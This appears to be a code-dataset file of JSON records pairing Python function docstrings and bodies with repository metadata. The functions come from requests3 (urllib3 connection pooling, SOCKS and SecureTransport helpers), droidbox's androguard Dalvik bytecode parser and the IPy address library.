{"docstring": "\"\"\"\nSame as :meth:`urllib3.connectionpool.HTTPConnectionPool.urlopen`\nwith redirect logic and only sends the request-uri portion of the\n``url``.\n\nThe given ``url`` parameter must be absolute, such that an appropriate\n:class:`urllib3.connectionpool.ConnectionPool` can be chosen for it.\n\"\"\"\n", "func_signal": "def urlopen(self, method, url, redirect=True, **kw):\n", "code": "u = parse_url(url)\nconn = self.connection_from_host(u.host, port=u.port, scheme=u.scheme)\n# Rewind body position, if needed. Record current position\n# for future rewinds in the event of a redirect/retry.\nbody = kw.get(\"body\")\nbody_pos = kw.get(\"body_pos\")\nkw[\"body_pos\"] = set_file_position(body, body_pos)\nif \"headers\" not in kw:\n    kw[\"headers\"] = self.headers\nif self.proxy is not None and u.scheme == \"http\":\n    response = conn.urlopen(method, url, **kw)\nelse:\n    response = conn.urlopen(method, u.request_uri, **kw)\nredirect_location = redirect and response.get_redirect_location()\nif not redirect_location:\n    return response\n\n# Support relative URLs for redirecting.\nredirect_location = urljoin(url, redirect_location)\n# RFC 7231, Section 6.4.4\nif response.status == 303:\n    method = \"GET\"\nretries = kw.get(\"retries\")\nif not isinstance(retries, Retry):\n    retries = Retry.from_int(retries, redirect=redirect)\ntry:\n    retries = retries.increment(method, url, response=response, _pool=conn)\nexcept MaxRetryError:\n    if retries.raise_on_redirect:\n        raise\n\n    return response\n\nkw[\"retries\"] = retries\nkw[\"redirect\"] = redirect\nretries.sleep_for_retry(response)\nlog.info(\"Redirecting %s -> %s\", url, redirect_location)\nreturn self.urlopen(method, redirect_location, **kw)", "path": "requests3\\core\\_http\\_sync\\poolmanager.py", "repo_name": "kennethreitz-archive/requests3", "stars": 793, "license": "cc0-1.0", "language": "python", "size": 9967}
{"docstring": "\"\"\"\nEstablish a new connection via the SOCKS proxy.\n\"\"\"\n", "func_signal": "def _do_socket_connect(self, connect_timeout, connect_kw):\n", "code": "try:\n    conn = socks.create_connection(\n        (self._host, self._port),\n        proxy_type=self._socks_options[\"socks_version\"],\n        proxy_addr=self._socks_options[\"proxy_host\"],\n        proxy_port=self._socks_options[\"proxy_port\"],\n        proxy_username=self._socks_options[\"username\"],\n        proxy_password=self._socks_options[\"password\"],\n        proxy_rdns=self._socks_options[\"rdns\"],\n        timeout=connect_timeout,\n        **connect_kw\n    )\nexcept SocketTimeout as e:\n    raise ConnectTimeoutError(\n        self,\n        \"Connection to %s timed out. (connect timeout=%s)\"\n        % (self._host, connect_timeout),\n    )\n\nexcept socks.ProxyError as e:\n    # This is fragile as hell, but it seems to be the only way to raise\n    # useful errors here.\n    if e.socket_err:\n        error = e.socket_err\n        if isinstance(error, SocketTimeout):\n            raise ConnectTimeoutError(\n                self,\n                \"Connection to %s timed out. (connect timeout=%s)\"\n                % (self._host, connect_timeout),\n            )\n\n        else:\n            raise NewConnectionError(\n                self, \"Failed to establish a new connection: %s\" % error\n            )\n\n    else:\n        raise NewConnectionError(\n            self, \"Failed to establish a new connection: %s\" % e\n        )\n\nexcept SocketError as e:  # Defensive: PySocks should catch all these.\n    raise NewConnectionError(\n        self, \"Failed to establish a new connection: %s\" % e\n    )\n\nreturn conn", "path": "requests3\\core\\_http\\contrib\\socks.py", "repo_name": "kennethreitz-archive/requests3", "stars": 793, "license": "cc0-1.0", "language": "python", "size": 9967}
{"docstring": "\"\"\"\nGiven a single file, loads all the trust objects from it into arrays and\nthe keychain.\nReturns a tuple of lists: the first list is a list of identities, the\nsecond a list of certs.\n\"\"\"\n", "func_signal": "def _load_items_from_file(keychain, path):\n", "code": "certificates = []\nidentities = []\nresult_array = None\nwith open(path, \"rb\") as f:\n    raw_filedata = f.read()\ntry:\n    filedata = CoreFoundation.CFDataCreate(\n        CoreFoundation.kCFAllocatorDefault, raw_filedata, len(raw_filedata)\n    )\n    result_array = CoreFoundation.CFArrayRef()\n    result = Security.SecItemImport(\n        filedata,  # cert data\n        None,  # Filename, leaving it out for now\n        None,  # What the type of the file is, we don't care\n        None,  # what's in the file, we don't care\n        0,  # import flags\n        None,  # key params, can include passphrase in the future\n        keychain,  # The keychain to insert into\n        ctypes.byref(result_array),  # Results\n    )\n    _assert_no_error(result)\n    # A CFArray is not very useful to us as an intermediary\n    # representation, so we are going to extract the objects we want\n    # and then free the array. We don't need to keep hold of keys: the\n    # keychain already has them!\n    result_count = CoreFoundation.CFArrayGetCount(result_array)\n    for index in range(result_count):\n        item = CoreFoundation.CFArrayGetValueAtIndex(result_array, index)\n        item = ctypes.cast(item, CoreFoundation.CFTypeRef)\n        if _is_cert(item):\n            CoreFoundation.CFRetain(item)\n            certificates.append(item)\n        elif _is_identity(item):\n            CoreFoundation.CFRetain(item)\n            identities.append(item)\nfinally:\n    if result_array:\n        CoreFoundation.CFRelease(result_array)\n    CoreFoundation.CFRelease(filedata)\nreturn (identities, certificates)", "path": "requests3\\core\\_http\\contrib\\_securetransport\\low_level.py", "repo_name": "kennethreitz-archive/requests3", "stars": 793, "license": "cc0-1.0", "language": "python", "size": 9967}
{"docstring": "\"\"\"\nGet a :class:`ConnectionPool` based on the host, port, and scheme.\n\nIf ``port`` isn't given, it will be derived from the ``scheme`` using\n``urllib3.connectionpool.port_by_scheme``. If ``pool_kwargs`` is\nprovided, it is merged with the instance's ``connection_pool_kw``\nvariable and used to create the new connection pool, if one is\nneeded.\n\"\"\"\n", "func_signal": "def connection_from_host(self, host, port=None, scheme=\"http\", pool_kwargs=None):\n", "code": "if not host:\n    raise LocationValueError(\"No host specified.\")\n\nrequest_context = self._merge_pool_kwargs(pool_kwargs)\nrequest_context[\"scheme\"] = scheme or \"http\"\nif not port:\n    port = DEFAULT_PORTS.get(request_context[\"scheme\"].lower(), 80)\nrequest_context[\"port\"] = port\nrequest_context[\"host\"] = host\nreturn self.connection_from_context(request_context)", "path": "requests3\\core\\_http\\_sync\\poolmanager.py", "repo_name": "kennethreitz-archive/requests3", "stars": 793, "license": "cc0-1.0", "language": "python", "size": 9967}
{"docstring": "\"\"\"\nGiven a bundle of certs in PEM format, turns them into a CFArray of certs\nthat can be used to validate a cert chain.\n\"\"\"\n", "func_signal": "def _cert_array_from_pem(pem_bundle):\n", "code": "der_certs = [\n    base64.b64decode(match.group(1)) for match in _PEM_CERTS_RE.finditer(pem_bundle)\n]\nif not der_certs:\n    raise ssl.SSLError(\"No root certificates specified\")\n\ncert_array = CoreFoundation.CFArrayCreateMutable(\n    CoreFoundation.kCFAllocatorDefault,\n    0,\n    ctypes.byref(CoreFoundation.kCFTypeArrayCallBacks),\n)\nif not cert_array:\n    raise ssl.SSLError(\"Unable to allocate memory!\")\n\ntry:\n    for der_bytes in der_certs:\n        certdata = _cf_data_from_bytes(der_bytes)\n        if not certdata:\n            raise ssl.SSLError(\"Unable to allocate memory!\")\n\n        cert = Security.SecCertificateCreateWithData(\n            CoreFoundation.kCFAllocatorDefault, certdata\n        )\n        CoreFoundation.CFRelease(certdata)\n        if not cert:\n            raise ssl.SSLError(\"Unable to build cert object!\")\n\n        CoreFoundation.CFArrayAppendValue(cert_array, cert)\n        CoreFoundation.CFRelease(cert)\nexcept Exception:\n    # We need to free the array before the exception bubbles further.\n    # We only want to do that if an error occurs: otherwise, the caller\n    # should free.\n    CoreFoundation.CFRelease(cert_array)\nreturn cert_array", "path": "requests3\\core\\_http\\contrib\\_securetransport\\low_level.py", "repo_name": "kennethreitz-archive/requests3", "stars": 793, "license": "cc0-1.0", "language": "python", "size": 9967}
{"docstring": "\"\"\"\nGet a :class:`ConnectionPool` based on the provided pool key.\n\n``pool_key`` should be a namedtuple that only contains immutable\nobjects. At a minimum it must have the ``scheme``, ``host``, and\n``port`` fields.\n\"\"\"\n", "func_signal": "def connection_from_pool_key(self, pool_key, request_context=None):\n", "code": "with self.pools.lock:\n    # If the scheme, host, or port doesn't match existing open\n    # connections, open a new ConnectionPool.\n    pool = self.pools.get(pool_key)\n    if pool:\n        return pool\n\n    # Make a fresh ConnectionPool of the desired type\n    scheme = request_context[\"scheme\"]\n    host = request_context[\"host\"]\n    port = request_context[\"port\"]\n    pool = self._new_pool(scheme, host, port, request_context=request_context)\n    self.pools[pool_key] = pool\nreturn pool", "path": "requests3\\core\\_http\\_sync\\poolmanager.py", "repo_name": "kennethreitz-archive/requests3", "stars": 793, "license": "cc0-1.0", "language": "python", "size": 9967}
{"docstring": "\"\"\"\nCreate a pool key out of a request context dictionary.\n\nAccording to RFC 3986, both the scheme and host are case-insensitive.\nTherefore, this function normalizes both before constructing the pool\nkey for an HTTPS request. If you wish to change this behaviour, provide\nalternate callables to ``key_fn_by_scheme``.\n\n:param key_class:\n    The class to use when constructing the key. This should be a namedtuple\n    with the ``scheme`` and ``host`` keys at a minimum.\n:type  key_class: namedtuple\n:param request_context:\n    A dictionary-like object that contain the context for a request.\n:type  request_context: dict\n\n:return: A namedtuple that can be used as a connection pool key.\n:rtype:  PoolKey\n\"\"\"\n# Since we mutate the dictionary, make a copy first\n", "func_signal": "def _default_key_normalizer(key_class, request_context):\n", "code": "context = request_context.copy()\ncontext[\"scheme\"] = context[\"scheme\"].lower()\ncontext[\"host\"] = context[\"host\"].lower()\n# These are both dictionaries and need to be transformed into frozensets\nfor key in (\"headers\", \"_proxy_headers\", \"_socks_options\"):\n    if key in context and context[key] is not None:\n        context[key] = frozenset(context[key].items())\n# The socket_options key may be a list and needs to be transformed into a\n# tuple.\nsocket_opts = context.get(\"socket_options\")\nif socket_opts is not None:\n    context[\"socket_options\"] = tuple(socket_opts)\n# Map the kwargs to the names in the namedtuple - this is necessary since\n# namedtuples can't have fields starting with '_'.\nfor key in list(context.keys()):\n    context[\"key_\" + key] = context.pop(key)\n# Default to ``None`` for keys missing from the context\nfor field in key_class._fields:\n    if field not in context:\n        context[field] = None\nreturn key_class(**context)", "path": "requests3\\core\\_http\\_sync\\poolmanager.py", "repo_name": "kennethreitz-archive/requests3", "stars": 793, "license": "cc0-1.0", "language": "python", "size": 9967}
{"docstring": "\"\"\"\nCreates a Unicode string from a CFString object. Used entirely for error\nreporting.\n\nYes, it annoys me quite a lot that this function is this complex.\n\"\"\"\n", "func_signal": "def _cf_string_to_unicode(value):\n", "code": "value_as_void_p = ctypes.cast(value, ctypes.POINTER(ctypes.c_void_p))\nstring = CoreFoundation.CFStringGetCStringPtr(\n    value_as_void_p, CFConst.kCFStringEncodingUTF8\n)\nif string is None:\n    buffer = ctypes.create_string_buffer(1024)\n    result = CoreFoundation.CFStringGetCString(\n        value_as_void_p, buffer, 1024, CFConst.kCFStringEncodingUTF8\n    )\n    if not result:\n        raise OSError(\"Error copying C string from CFStringRef\")\n\n    string = buffer.value\nif string is not None:\n    string = string.decode(\"utf-8\")\nreturn string", "path": "requests3\\core\\_http\\contrib\\_securetransport\\low_level.py", "repo_name": "kennethreitz-archive/requests3", "stars": 793, "license": "cc0-1.0", "language": "python", "size": 9967}
{"docstring": "\"\"\"\nReturns True if a given CFTypeRef is a certificate.\n\"\"\"\n", "func_signal": "def _is_cert(item):\n", "code": "expected = Security.SecCertificateGetTypeID()\nreturn CoreFoundation.CFGetTypeID(item) == expected", "path": "requests3\\core\\_http\\contrib\\_securetransport\\low_level.py", "repo_name": "kennethreitz-archive/requests3", "stars": 793, "license": "cc0-1.0", "language": "python", "size": 9967}
{"docstring": "\"\"\"\nGiven a list of Python tuples, create an associated CFDictionary.\n\"\"\"\n", "func_signal": "def _cf_dictionary_from_tuples(tuples):\n", "code": "dictionary_size = len(tuples)\n# We need to get the dictionary keys and values out in the same order.\nkeys = (t[0] for t in tuples)\nvalues = (t[1] for t in tuples)\ncf_keys = (CoreFoundation.CFTypeRef * dictionary_size)(*keys)\ncf_values = (CoreFoundation.CFTypeRef * dictionary_size)(*values)\nreturn CoreFoundation.CFDictionaryCreate(\n    CoreFoundation.kCFAllocatorDefault,\n    cf_keys,\n    cf_values,\n    dictionary_size,\n    CoreFoundation.kCFTypeDictionaryKeyCallBacks,\n    CoreFoundation.kCFTypeDictionaryValueCallBacks,\n)", "path": "requests3\\core\\_http\\contrib\\_securetransport\\low_level.py", "repo_name": "kennethreitz-archive/requests3", "stars": 793, "license": "cc0-1.0", "language": "python", "size": 9967}
{"docstring": "\"\"\"\nCreate a new :class:`ConnectionPool` based on host, port, scheme, and\nany additional pool keyword arguments.\n\nIf ``request_context`` is provided, it is provided as keyword arguments\nto the pool class used. This method is used to actually create the\nconnection pools handed out by :meth:`connection_from_url` and\ncompanion methods. It is intended to be overridden for customization.\n\"\"\"\n", "func_signal": "def _new_pool(self, scheme, host, port, request_context=None):\n", "code": "pool_cls = self.pool_classes_by_scheme[scheme]\nif request_context is None:\n    request_context = self.connection_pool_kw.copy()\n# Although the context has everything necessary to create the pool,\n# this function has historically only used the scheme, host, and port\n# in the positional args. When an API change is acceptable these can\n# be removed.\nfor key in (\"scheme\", \"host\", \"port\"):\n    request_context.pop(key, None)\nif scheme == \"http\":\n    for kw in SSL_KEYWORDS:\n        request_context.pop(kw, None)\nreturn pool_cls(host, port, backend=self.backend, **request_context)", "path": "requests3\\core\\_http\\_sync\\poolmanager.py", "repo_name": "kennethreitz-archive/requests3", "stars": 793, "license": "cc0-1.0", "language": "python", "size": 9967}
{"docstring": "#: Original Content-Type header\n", "func_signal": "def __init__(self, content, content_type, encoding=\"utf-8\"):\n", "code": "self.content_type = content_type\n#: Response body encoding\nself.encoding = encoding\n#: Parsed parts of the multipart response body\nself.parts = tuple()\nself._find_boundary()\nself._parse_body(content)", "path": "requests3\\toolbelt\\multipart\\decoder.py", "repo_name": "kennethreitz-archive/requests3", "stars": 793, "license": "cc0-1.0", "language": "python", "size": 9967}
{"docstring": "\"\"\"\nGet a :class:`ConnectionPool` based on the request context.\n\n``request_context`` must at least contain the ``scheme`` key and its\nvalue must be a key in ``key_fn_by_scheme`` instance variable.\n\"\"\"\n", "func_signal": "def connection_from_context(self, request_context):\n", "code": "scheme = request_context[\"scheme\"].lower()\npool_key_constructor = self.key_fn_by_scheme[scheme]\npool_key = pool_key_constructor(request_context)\nreturn self.connection_from_pool_key(pool_key, request_context=request_context)", "path": "requests3\\core\\_http\\_sync\\poolmanager.py", "repo_name": "kennethreitz-archive/requests3", "stars": 793, "license": "cc0-1.0", "language": "python", "size": 9967}
{"docstring": "\"\"\"\nThis function creates a temporary Mac keychain that we can use to work with\ncredentials. This keychain uses a one-time password and a temporary file to\nstore the data. We expect to have one keychain per socket. The returned\nSecKeychainRef must be freed by the caller, including calling\nSecKeychainDelete.\n\nReturns a tuple of the SecKeychainRef and the path to the temporary\ndirectory that contains it.\n\"\"\"\n# Unfortunately, SecKeychainCreate requires a path to a keychain. This\n# means we cannot use mkstemp to use a generic temporary file. Instead,\n# we're going to create a temporary directory and a filename to use there.\n# This filename will be 8 random bytes expanded into base64. We also need\n# some random bytes to password-protect the keychain we're creating, so we\n# ask for 40 random bytes.\n", "func_signal": "def _temporary_keychain():\n", "code": "random_bytes = os.urandom(40)\nfilename = base64.b64encode(random_bytes[:8]).decode(\"utf-8\")\npassword = base64.b64encode(random_bytes[8:])  # Must be valid UTF-8\ntempdirectory = tempfile.mkdtemp()\nkeychain_path = os.path.join(tempdirectory, filename).encode(\"utf-8\")\n# We now want to create the keychain itself.\nkeychain = Security.SecKeychainRef()\nstatus = Security.SecKeychainCreate(\n    keychain_path, len(password), password, False, None, ctypes.byref(keychain)\n)\n_assert_no_error(status)\n# Having created the keychain, we want to pass it off to the caller.\nreturn keychain, tempdirectory", "path": "requests3\\core\\_http\\contrib\\_securetransport\\low_level.py", "repo_name": "kennethreitz-archive/requests3", "stars": 793, "license": "cc0-1.0", "language": "python", "size": 9967}
{"docstring": "\"\"\"\n    Display where this field is read or written\n\"\"\"\n", "func_signal": "def show_dref(self) :\n", "code": "try :\n    bytecode._PrintSubBanner(\"DREF\") \n    bytecode._PrintDRef(\"R\", self.DREFr.items)\n    bytecode._PrintDRef(\"W\", self.DREFw.items)\n    bytecode._PrintSubBanner() \nexcept AttributeError:\n    pass", "path": "APIMonitor\\androguard\\core\\bytecodes\\dvm.py", "repo_name": "pjlantz/droidbox", "stars": 685, "license": "None", "language": "python", "size": 1776}
{"docstring": "\"\"\"\n    Transform an access flags to the corresponding string\n\n    :param value: the value of the access flags\n    :type value: int\n\n    :rtype: string\n\"\"\"\n", "func_signal": "def get_access_flags_string(value) :\n", "code": "buff = \"\"\nfor i in ACCESS_FLAGS :\n  if (i[0] & value) == i[0] :\n    buff += i[1] + \" \"\n\nif buff != \"\" :\n  return buff[:-1]\nreturn buff", "path": "APIMonitor\\androguard\\core\\bytecodes\\dvm.py", "repo_name": "pjlantz/droidbox", "stars": 685, "license": "None", "language": "python", "size": 1776}
{"docstring": "\"\"\"\n    Return the specific field\n\n    :param class_name: the class name of the field\n    :type class_name: string\n    :param field_name: the name of the field\n    :type field_name: string\n    :param descriptor: the descriptor of the field\n    :type descriptor: string\n\n    :rtype: None or a :class:`EncodedField` object\n\"\"\"\n", "func_signal": "def get_field_descriptor(self, class_name, field_name, descriptor) :\n", "code": "for i in self.classes.class_def :\n    if class_name == i.get_name() :\n        for j in i.get_fields() :\n            if field_name == j.get_name() and descriptor == j.get_descriptor() :\n                return j\nreturn None", "path": "APIMonitor\\androguard\\core\\bytecodes\\dvm.py", "repo_name": "pjlantz/droidbox", "stars": 685, "license": "None", "language": "python", "size": 1776}
{"docstring": "\"\"\"\n    Return the access flags string of the method\n\n    :rtype: string\n\"\"\"\n", "func_signal": "def get_access_flags_string(self) :\n", "code": "if self.access_flags_string == None :\n    self.access_flags_string = get_access_flags_string( self.get_access_flags() )\n\n    if self.access_flags_string == \"\" :\n        self.access_flags_string = \"0x%x\" % self.get_access_flags()\nreturn self.access_flags_string", "path": "APIMonitor\\androguard\\core\\bytecodes\\dvm.py", "repo_name": "pjlantz/droidbox", "stars": 685, "license": "None", "language": "python", "size": 1776}
{"docstring": "\"\"\"\n    Set the instructions\n\n    :param instructions: the list of instructions\n    :type instructions: a list of :class:`Instruction`\n\"\"\"\n", "func_signal": "def set_instructions(self, instructions) :\n", "code": "if self.code == None :\n  return []\nreturn self.code.get_bc().set_instructions(instructions)", "path": "APIMonitor\\androguard\\core\\bytecodes\\dvm.py", "repo_name": "pjlantz/droidbox", "stars": 685, "license": "None", "language": "python", "size": 1776}
{"docstring": "\"\"\"\n    Add a message to a specific instruction by using (default) the index of the address if specified\n\n    :param msg: the message\n    :type msg: string\n    :param idx: index of the instruction (the position in the list of the instruction)\n    :type idx: int\n    :param off: address of the instruction\n    :type off: int\n\"\"\"\n", "func_signal": "def add_inote(self, msg, idx, off=None) :\n", "code": "if self.code != None :  \n    self.code.add_inote(msg, idx, off)", "path": "APIMonitor\\androguard\\core\\bytecodes\\dvm.py", "repo_name": "pjlantz/droidbox", "stars": 685, "license": "None", "language": "python", "size": 1776}
{"docstring": "\"\"\"\n    Set the start address of the buffer to disassemble\n\n    :param idx: the index\n    :type idx: int\n\"\"\"\n", "func_signal": "def set_code_idx(self, idx) :\n", "code": "if self.code != None :\n    self.code.set_idx( idx )", "path": "APIMonitor\\androguard\\core\\bytecodes\\dvm.py", "repo_name": "pjlantz/droidbox", "stars": 685, "license": "None", "language": "python", "size": 1776}
{"docstring": "\"\"\"\n    Return all methods of a specific class\n\n    :param class_name: the class name\n    :type class_name: string\n\n    :rtype: a list with :class:`EncodedMethod` objects\n\"\"\"\n", "func_signal": "def get_methods_class(self, class_name) :\n", "code": "l = []\nfor i in self.classes.class_def :\n    for j in i.get_methods() :\n        if class_name == j.get_class_name() :\n            l.append( j )\n\nreturn l", "path": "APIMonitor\\androguard\\core\\bytecodes\\dvm.py", "repo_name": "pjlantz/droidbox", "stars": 685, "license": "None", "language": "python", "size": 1776}
{"docstring": "\"\"\"\n    Get a particular instruction by using the address\n\n    :param off: address of the instruction\n    :type off: int\n\n    :rtype: an :class:`Instruction` object\n\"\"\"\n", "func_signal": "def get_ins_off(self, off) :\n", "code": "idx = 0\nfor i in self.get_instructions() :\n    if idx == off :\n        return i\n    idx += i.get_length()\nreturn None", "path": "APIMonitor\\androguard\\core\\bytecodes\\dvm.py", "repo_name": "pjlantz/droidbox", "stars": 685, "license": "None", "language": "python", "size": 1776}
{"docstring": "\"\"\"\n    Return the descriptor\n\n    :rtype: string\n\"\"\"\n", "func_signal": "def get_descriptor(self) :\n", "code": "proto = self.get_proto()\nreturn proto[0] + proto[1]", "path": "APIMonitor\\androguard\\core\\bytecodes\\dvm.py", "repo_name": "pjlantz/droidbox", "stars": 685, "license": "None", "language": "python", "size": 1776}
{"docstring": "\"\"\"\n  Retrieve the type of a descriptor (e.g : I)\n\"\"\"\n", "func_signal": "def get_type(atype, size=None):\n", "code": "if atype.startswith('java.lang'):\n    atype = atype.replace('java.lang.', '')\nres = TYPE_DESCRIPTOR.get(atype.lstrip('java.lang'))\nif res is None:\n    if atype[0] == 'L':\n        res = atype[1:-1].replace('/', '.')\n    elif atype[0] == '[':\n        if size is None:\n            res = '%s[]' % get_type(atype[1:])\n        else:\n            res = '%s[%s]' % (get_type(atype[1:]), size)\n    else:\n        res = atype\nreturn res", "path": "APIMonitor\\androguard\\core\\bytecodes\\dvm.py", "repo_name": "pjlantz/droidbox", "stars": 685, "license": "None", "language": "python", "size": 1776}
{"docstring": "\"\"\"\n    Return the 'kind' argument of the instruction\n\n    :rtype: int\n\"\"\"\n", "func_signal": "def get_kind(self) :\n", "code": "if self.OP > 0xff :\n  if self.OP >= 0xf2ff :\n    return DALVIK_OPCODES_OPTIMIZED[ self.OP ][1][1]\n  return DALVIK_OPCODES_EXTENDED_WIDTH[ self.OP ][1][1]\nreturn DALVIK_OPCODES_FORMAT[ self.OP ][1][1]", "path": "APIMonitor\\androguard\\core\\bytecodes\\dvm.py", "repo_name": "pjlantz/droidbox", "stars": 685, "license": "None", "language": "python", "size": 1776}
{"docstring": "\"\"\"\n    Display the basic information about the method\n\"\"\"\n", "func_signal": "def show_info(self) :\n", "code": "bytecode._PrintSubBanner(\"Method Information\") \nbytecode._PrintDefault(\"%s->%s%s [access_flags=%s]\\n\" % ( self.get_class_name(), self.get_name(), self.get_descriptor(), self.get_access_flags_string() ))", "path": "APIMonitor\\androguard\\core\\bytecodes\\dvm.py", "repo_name": "pjlantz/droidbox", "stars": 685, "license": "None", "language": "python", "size": 1776}
{"docstring": "\"\"\"\n  Return the debug object associated to this method\n\n  :rtype: :class:`DebugInfoItem`\n\"\"\"\n", "func_signal": "def get_debug(self) :\n", "code": "if self.code == None :\n    return None\nreturn self.code.get_debug()", "path": "APIMonitor\\androguard\\core\\bytecodes\\dvm.py", "repo_name": "pjlantz/droidbox", "stars": 685, "license": "None", "language": "python", "size": 1776}
{"docstring": "\"\"\"\n    Return a list all methods which corresponds to the regexp\n\n    :param name: the name of the method (a python regexp)\n\n    :rtype: a list with all :class:`EncodedMethod` objects\n\"\"\"\n", "func_signal": "def get_method(self, name) :\n", "code": "prog = re.compile(name)\nl = []\nfor i in self.classes.class_def :\n    for j in i.get_methods() :\n        if prog.match( j.get_name() ) :\n            l.append( j )\nreturn l", "path": "APIMonitor\\androguard\\core\\bytecodes\\dvm.py", "repo_name": "pjlantz/droidbox", "stars": 685, "license": "None", "language": "python", "size": 1776}
{"docstring": "\"\"\"\n    Return the access flags string of the field\n\n    :rtype: string\n\"\"\"\n", "func_signal": "def get_access_flags_string(self) :\n", "code": "if self.access_flags_string == None :\n    self.access_flags_string = get_access_flags_string( self.get_access_flags() )\n\n    if self.access_flags_string == \"\" :\n        self.access_flags_string = \"0x%x\" % self.get_access_flags()\nreturn self.access_flags_string", "path": "APIMonitor\\androguard\\core\\bytecodes\\dvm.py", "repo_name": "pjlantz/droidbox", "stars": 685, "license": "None", "language": "python", "size": 1776}
{"docstring": "\"\"\"\n    Return a list of field items\n\n    :rtype: a list of :class:`FieldItem` objects\n\"\"\"\n", "func_signal": "def get_all_fields(self) :\n", "code": "try :\n    return self.fields.gets()\nexcept AttributeError :\n    return []", "path": "APIMonitor\\androguard\\core\\bytecodes\\dvm.py", "repo_name": "pjlantz/droidbox", "stars": 685, "license": "None", "language": "python", "size": 1776}
{"docstring": "\"\"\"\n    Return all methods of this class\n\n    :rtype: a list of :class:`EncodedMethod` objects\n\"\"\"\n", "func_signal": "def get_methods(self) :\n", "code": "if self.class_data_item != None :\n    return self.class_data_item.get_methods()\nreturn []", "path": "APIMonitor\\androguard\\core\\bytecodes\\dvm.py", "repo_name": "pjlantz/droidbox", "stars": 685, "license": "None", "language": "python", "size": 1776}
{"docstring": "\"\"\"\n    Display the information (with a pretty print) about the method\n\"\"\"\n", "func_signal": "def pretty_show(self) :\n", "code": "self.show_info()\nself.show_notes()\nif self.code != None :\n    self.each_params_by_register( self.code.get_registers_size(), self.get_descriptor() )\n    if self.CM.get_vmanalysis() == None :\n        self.code.show()\n    else :\n        self.code.pretty_show( self.CM.get_vmanalysis().get_method( self ) )\n        self.show_xref()", "path": "APIMonitor\\androguard\\core\\bytecodes\\dvm.py", "repo_name": "pjlantz/droidbox", "stars": 685, "license": "None", "language": "python", "size": 1776}
{"docstring": "\"\"\"\n    Export classes/methods/fields' names in the python namespace\n\"\"\"\n", "func_signal": "def create_python_export(self) :\n", "code": "for _class in self.get_classes() :\n  self._create_python_export_class(_class)", "path": "APIMonitor\\androguard\\core\\bytecodes\\dvm.py", "repo_name": "pjlantz/droidbox", "stars": 685, "license": "None", "language": "python", "size": 1776}
{"docstring": "\"\"\"Return the binary representation of an integer as string.\"\"\"\n\n", "func_signal": "def _intToBin(val):\n", "code": "if val < 0:\n    raise ValueError(\"Only positive values allowed\")\ns = \"%x\" % val\nret = ''\nfor x in s:\n    ret += _BitTable[x]\n# remove leading zeros\nwhile ret[0] == '0' and len(ret) > 1:\n    ret = ret[1:]\nreturn ret", "path": "thirdpart\\IPy.py", "repo_name": "boy-hack/w8fuckcdn", "stars": 627, "license": "None", "language": "python", "size": 974}
{"docstring": "\"\"\"Find the highest bit set to 1 in an integer.\"\"\"\n", "func_signal": "def _count1Bits(num):\n", "code": "ret = 0\nwhile num > 0:\n    num = num >> 1\n    ret += 1\nreturn ret", "path": "thirdpart\\IPy.py", "repo_name": "boy-hack/w8fuckcdn", "stars": 627, "license": "None", "language": "python", "size": 974}
{"docstring": "\"\"\"Check the validity of a prefix\n\nChecks if the variant part of a prefix only has 0s, and the length is\ncorrect.\n\n>>> _checkPrefix(0x7f000000, 24, 4)\n1\n>>> _checkPrefix(0x7f000001, 24, 4)\n0\n>>> repr(_checkPrefix(0x7f000001, -1, 4))\n'None'\n>>> repr(_checkPrefix(0x7f000001, 33, 4))\n'None'\n\"\"\"\n\n# TODO: unify this v4/v6/invalid code in a function\n", "func_signal": "def _checkPrefix(ip, prefixlen, version):\n", "code": "bits = _ipVersionToLen(version)\n\nif prefixlen < 0 or prefixlen > bits:\n    return None\n\nif ip == 0:\n    zbits = bits + 1\nelse:\n    zbits = _count0Bits(ip)\nif zbits <  bits - prefixlen:\n    return 0\nelse:\n    return 1", "path": "thirdpart\\IPy.py", "repo_name": "boy-hack/w8fuckcdn", "stars": 627, "license": "None", "language": "python", "size": 974}
{"docstring": "\"\"\"Transform a single IP address into a network specification by\napplying the given netmask.\n\nReturns a new IP instance.\n\n>>> print(IP('127.0.0.1').make_net('255.0.0.0'))\n127.0.0.0/8\n\"\"\"\n", "func_signal": "def make_net(self, netmask):\n", "code": "if '/' in str(netmask):\n    raise ValueError(\"invalid netmask (%s)\" % netmask)\nreturn IP('%s/%s' % (self, netmask), make_net=True)", "path": "thirdpart\\IPy.py", "repo_name": "boy-hack/w8fuckcdn", "stars": 627, "license": "None", "language": "python", "size": 974}
{"docstring": "# Make sure it's iterable, otherwise wrap\n", "func_signal": "def __init__(self, iterable=[]):\n", "code": "if not isinstance(iterable, collections.Iterable):\n    raise TypeError(\"'%s' object is not iterable\" % type(iterable).__name__)\n\n# Make sure we only accept IP objects\nfor prefix in iterable:\n    if not isinstance(prefix, IP):\n        raise ValueError('Only IP objects can be added to an IPSet')\n    \n# Store and optimize\nself.prefixes = iterable[:]\nself.optimize()", "path": "thirdpart\\IPy.py", "repo_name": "boy-hack/w8fuckcdn", "stars": 627, "license": "None", "language": "python", "size": 974}
{"docstring": "\"\"\"\nReturns the IPv6 mapped address of an IPv4 address, or the corresponding\nIPv4 address if the IPv6 address is in the appropriate range.\nRaises a ValueError if the IPv6 address is not translatable. See RFC 4291.\n\n>>> IP('192.168.1.1').v46map()\nIP('::ffff:192.168.1.1')\n>>> IP('::ffff:192.168.1.1').v46map()\nIP('192.168.1.1')\n\"\"\"\n", "func_signal": "def v46map(self):\n", "code": "if self._ipversion == 4:\n    return IP(str(IPV6_MAP_MASK + self.ip) + \n                  \"/%s\" % (self._prefixlen + 96))\nelse:\n    if self.ip & IPV6_TEST_MAP == IPV6_MAP_MASK:\n        return IP(str(self.ip - IPV6_MAP_MASK) +\n                  \"/%s\" % (self._prefixlen - 96))\nraise ValueError(\"%s cannot be converted to an IPv4 address.\"\n                 % repr(self))", "path": "thirdpart\\IPy.py", "repo_name": "boy-hack/w8fuckcdn", "stars": 627, "license": "None", "language": "python", "size": 974}
